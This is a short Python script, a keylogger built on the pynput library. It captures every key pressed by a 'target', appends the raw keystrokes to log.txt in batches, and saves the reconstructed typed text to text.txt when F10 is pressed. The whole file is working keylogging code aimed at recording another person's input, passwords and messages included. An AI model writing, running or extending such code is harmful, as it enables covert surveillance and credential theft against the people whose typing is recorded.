from pynput.keyboard import Key, Listener
count=0
keys=[]
all_keys=[]
def what_happens_when_target_presses_a_key(key):
    global keys, count, all_keys
    count += 1
    if(key == Key.backspace):
        keys.pop() #erasing last character entered when backspace is pressed
    elif str(key).find("Key") == -1:
        keys.append(key)
    all_keys.append(key)
    if count >= 10:
         count=0
         write_file_all_keys_pressed(all_keys)
         print("\n")
         all_keys=[]
    print(f"Target pressed {key}")
    
    
def write_file_all_keys_pressed(all_keys):
    with open("log.txt", "a") as f:
        for key in all_keys:
            k = str(key).replace("'", "")
            if k.find("Key.space") == 0:
                f.write(' ')
            elif k.find("Key.enter") == 0:
                f.write('\n')
            elif k.find("Key.shift") == 0 :
                f.write('')
            elif k.find("Key") == -1:
                f.write(k)
            else:
                f.write(f"//{k}//")
def write_file_only_text(keys):
    with open("text.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("Key.space") == 0:
                f.write(' ')
            elif k.find("Key.enter") == 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def stop_logging_keys(key):
    if key == Key.f10:
        write_file_only_text(keys)
        return False

with Listener( on_press=what_happens_when_target_presses_a_key, on_release=stop_logging_keys) as l:
    l.join()
  
